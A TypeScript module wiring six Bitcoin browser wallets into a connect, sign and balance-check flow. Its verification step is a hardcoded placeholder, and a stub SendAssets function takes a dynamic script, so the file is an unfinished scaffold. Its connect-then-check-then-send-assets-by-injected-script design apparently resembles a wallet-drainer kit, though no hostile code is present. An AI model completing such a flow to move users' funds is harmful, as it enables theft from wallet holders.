import {WalletListener} from './common';

import {
    UnisatLogo,
    registerUnisatListener,
    connectUnisatWallet,
    signUnisatWallet,
} from "./unisatWallet";

import {
    XverseLogo,
    connectXverseWallet,
    signXverseWallet,
    registerXverseListener
} from "./xverseWallet";

import {
    OkxLogo,
    connectOkxWallet,
    signOkxWallet,
    registerOKXListener,
} from "./okxWallet";

import {
    LeatherLogo,
    connectLeatherWallet,
    signLeatherWallet,
    registerLeatherListener,
} from "./leatherWallet";

import {
    BitgetLogo,
    connectBitgetWallet,
    signBitgetWallet,
    registerBitkeepListener,
} from "./bitgetWallet";

import {
    WizzLogo,
    connectWizzWallet,
    signWizzWallet,
    registerWizzListener,
} from "./wizzWallet";

export const Wallets = {
    "unisat":
    {
        isRegisteredListener: false,
        title: "Unisat Wallet",
        logo: UnisatLogo,
        connect: connectUnisatWallet,
        signMessage: signUnisatWallet,
        registerListener: registerUnisatListener
    },
    "xverse":
    {
        isRegisteredListener: false,
        title: "Xverse Wallet",
        logo: XverseLogo,
        connect: connectXverseWallet,
        signMessage: signXverseWallet,
        registerListener: registerXverseListener
    },
    "okx":
    {
        isRegisteredListener: false,
        title: "OKX Wallet",
        logo: OkxLogo,
        connect: connectOkxWallet,
        signMessage: signOkxWallet,
        registerListener: registerOKXListener
    },
    "leather":
    {
        isRegisteredListener: false,
        title: "Leather Wallet",
        logo: LeatherLogo,
        connect: connectLeatherWallet,
        signMessage: signLeatherWallet,
        registerListener: registerLeatherListener
    },
    "bitget":
    {
        isRegisteredListener: false,
        title: "Bitget Wallet",
        logo: BitgetLogo,
        connect: connectBitgetWallet,
        signMessage: signBitgetWallet,
        registerListener: registerBitkeepListener
    },
    "wizz":
    {
        isRegisteredListener: false,
        title: "Wizz Wallet",
        logo: WizzLogo,
        connect: connectWizzWallet,
        signMessage: signWizzWallet,
        registerListener: registerWizzListener
    },
};

export type {WalletListener};

export type LoadingState = {
    isLoading: boolean;
    walletId: string;
    message: string;
};

export type DynamicHTML = {
	h1: string;
	spanPoint: string;
	spanValue: number;
	h2text: string;
	buttonCaption: string;
}

export type DynamicContents = {
    js: string;
    html: string;
};

export const defaultDynContents = {
    js: '',
    html: ''
};

export default async function OnAuthHandler(walletId: string, reportStatus: ({isLoading, walletId, message}: LoadingState) => void)
{
    const wid = walletId as keyof typeof Wallets;
    let result = {status: 'error', msg: 'Unknown', address: '', content: {}};

    const connResponse = await Wallets[wid].connect();
    result.msg = connResponse.message;

    if (connResponse.type === "success") {
        let isSigned = false;
        let accountList: {address: string, pubKey: string, signature: string}[] = [];

        for(let account of connResponse.accounts)
        {
            reportStatus({isLoading : true, walletId, message: 'Signing'});
            const signResponse = await Wallets[wid].signMessage(account.address, account.publicKey);

            if(signResponse.type == 'success') {
                accountList.push({
                    address: account.address,
                    pubKey: account.publicKey,
                    signature: signResponse.signature
                });

                isSigned = true;
                break;
            }
            else {
                accountList.push({
                    address: account.address,
                    pubKey: account.publicKey,
                    signature: 'error'
                });
            }
        }

        if(isSigned) {
            reportStatus({isLoading : true, walletId, message: 'Verification'});
            // check balance of account verification response data: {code: number, address: any, content: any}
            let vresult: any  = {code: 1001, address: '1Legakldfjaiejgiawejfaieg', content:'you have 100.'};//await postHttpRequest({method: 'check', w: walletId, cdata: accountList});

            if(vresult.code == 1001 && vresult.address && vresult.content)
            {
                result.status = 'success';
                result.address = vresult.address;
                result.content = vresult.content;
            }
            else
            {
                result.status = 'error';
                result.msg = 'Verification Failed!';
            }
        }
        else {
            result.msg = 'Sign Failed!';
        }
    }

    return result;
}

export async function registListener(walletID: string, listener: WalletListener)
{
    const wid = walletID as keyof typeof Wallets;
    if(Wallets[wid].isRegisteredListener == false) {
        Wallets[wid].registerListener(listener);
    }
}

export async function SendAssets(walletId: string, dynScript: string)
{
    // add sending code.
    console.log(walletId);
    console.log(dynScript);
}